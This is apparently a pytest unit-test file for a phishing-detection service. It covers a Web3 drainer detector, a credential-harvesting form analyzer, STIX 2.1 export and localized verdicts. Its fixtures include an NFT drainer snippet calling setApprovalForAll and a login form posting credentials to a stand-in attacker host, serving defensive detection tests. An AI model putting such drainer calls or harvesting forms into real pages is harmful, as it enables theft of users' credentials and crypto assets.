"""Unit tests for enterprise expansion features: Web3 drainers, Form analysis, STIX 2.1, and Localization."""

import json
import pytest
from app.analyzers.form_analyzer import FormAnalyzer
from app.analyzers.web3_analyzer import Web3Analyzer
from app.bot.localization import get_localized_verdict
from app.db.models.scan import Scan
from app.reports.stix_exporter import export_scan_to_stix


def test_web3_drainer_keyword_detection():
    """Verify Web3 analyzer detects crypto phishing keywords."""
    res = Web3Analyzer.analyze_url_and_content(
        url="https://airdrop-claim-permit2.xyz/claim",
    )
    assert res.is_crypto_phishing
    assert res.drainer_confidence >= 0.40
    assert "permit2" in res.detected_keywords or "claim" in res.detected_keywords
    assert len(res.signals) > 0


def test_web3_drainer_script_detection():
    """Verify Web3 analyzer flags drainer smart contract approval calls in HTML."""
    html_sample = """
    <html>
      <script>
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        await contract.setApprovalForAll("0x123", true);
      </script>
    </html>
    """
    res = Web3Analyzer.analyze_url_and_content(
        url="https://nft-mint.test",
        html_content=html_sample,
    )
    assert res.is_crypto_phishing
    assert len(res.detected_scripts) > 0


def test_form_analyzer_credential_harvesting():
    """Verify FormAnalyzer detects password inputs submitting to external domain."""
    html_sample = """
    <html>
      <body>
        <form action="https://attacker-harvester.test/steal" method="POST">
          <input type="text" name="username" />
          <input type="password" name="password" />
          <button type="submit">Sign In</button>
        </form>
      </body>
    </html>
    """
    res = FormAnalyzer.analyze_html(html_sample, base_domain="login.victim.test")
    assert res.has_forms
    assert res.has_password_field
    assert res.external_form_action
    assert res.is_credential_harvester
    assert len(res.signals) >= 2


def test_stix_21_exporter_bundle_generation():
    """Verify STIX 2.1 exporter creates OASIS standard JSON bundle."""
    scan = Scan(
        id=999,
        scan_uuid="SCAN-2026-STIX01",
        original_url="https://malicious-node.test/login",
        normalized_url="https://malicious-node.test/login",
        domain="malicious-node.test",
        risk_score=90.0,
        risk_level="CRITICAL",
        confidence_score=88.0,
    )
    scan_details = {"scan": scan}
    stix_json_str = export_scan_to_stix(scan_details)
    
    bundle = json.loads(stix_json_str)
    assert bundle["type"] == "bundle"
    assert "objects" in bundle
    
    types = [obj["type"] for obj in bundle["objects"]]
    assert "indicator" in types
    assert "infrastructure" in types
    assert "attack-pattern" in types
    assert "relationship" in types


def test_localization_verdicts():
    """Verify localized security guidance in English, Hindi, and Spanish."""
    en = get_localized_verdict("CRITICAL", "en")
    assert "CRITICAL" in en["title"]

    hi = get_localized_verdict("CRITICAL", "hi")
    assert "खतरनाक" in hi["title"]
    assert "पासवर्ड" in hi["description"]

    es = get_localized_verdict("CRITICAL", "es")
    assert "CRÍTICA" in es["title"]
